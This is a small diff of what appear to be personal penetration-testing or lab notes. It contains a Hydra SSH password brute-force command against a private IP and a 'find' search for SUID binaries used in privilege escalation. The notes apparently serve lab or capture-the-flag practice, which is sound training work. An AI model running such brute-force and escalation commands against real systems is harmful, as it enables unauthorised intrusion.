@@ -33,3 +33,4 @@ https://tylerrockwell.github.io/defeating-basic-auth-with-hydra/
 ![[Pasted image 20250117191545.png]]
 `hydra -l GrumpyCat -P pw.txt 192.168.15.3 ssh -t 4`
 `find -perm -4000 2> /dev/null`
+![[Pasted image 20250117195129.png]]
